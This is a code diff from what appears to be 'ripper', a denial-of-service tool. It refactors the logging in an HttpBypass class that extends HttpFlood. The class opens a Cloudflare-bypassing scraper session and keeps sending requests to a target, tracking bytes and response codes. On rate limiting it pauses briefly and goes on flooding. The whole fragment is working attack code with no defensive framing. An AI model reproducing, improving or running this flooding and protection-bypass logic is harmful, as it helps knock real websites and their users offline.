@@ -7,9 +7,12 @@ from requests import Response
 from ripper.actions.http_flood import HttpFlood
 from ripper.context.errors import Errors
 from ripper.context.target import Target
+from ripper.context.events_journal import EventsJournal
 
 # Forward Reference
 Context = 'Context'
+
+Events = EventsJournal()
 
 
 class RateLimitException(BaseException):
@@ -45,11 +48,12 @@ class HttpBypass(HttpFlood):
         }
         with suppress(Exception), create_scraper(browser=browser) as self._http_connect:
             self._ctx.target.statistic.connect.status_success()
-            self._ctx.events.info('Creating CloudFlare scraper connection.')
+            Events.info('Creating CloudFlare scraper connection.')
             while self.send(self._http_connect):
                 if self._ctx.dry_run:
                     break
                 continue
+            self._ctx.target.statistic.connect.status_failed()
 
     def send(self, scraper: CloudScraper):
         try:
@@ -59,13 +63,11 @@ class HttpBypass(HttpFlood):
                 self._ctx.target.statistic.http_stats[response.status_code] += 1
                 self.check_rate_limit(response)
         except RateLimitException as e:
-            self._ctx.events.warn('Rate Limit caught...')
-            self._ctx.add_error(Errors(type(e).__name__, e.__str__()))
+            Events.warn(f'{type(e).__name__} {e.__str__()}')
             time.sleep(3.01)
+            return True
         except Exception as e:
-            self._ctx.events.error(f'{type(e).__name__} caught...')
-            self._ctx.add_error(Errors(type(e).__name__, e.__str__()[:128]))
-            self._ctx.target.statistic.connect.status_failed()
+            Events.exception(e)
         else:
             sent_bytes = self._size_of_request(response.request)
             self._ctx.target.statistic.packets.status_sent(sent_bytes)
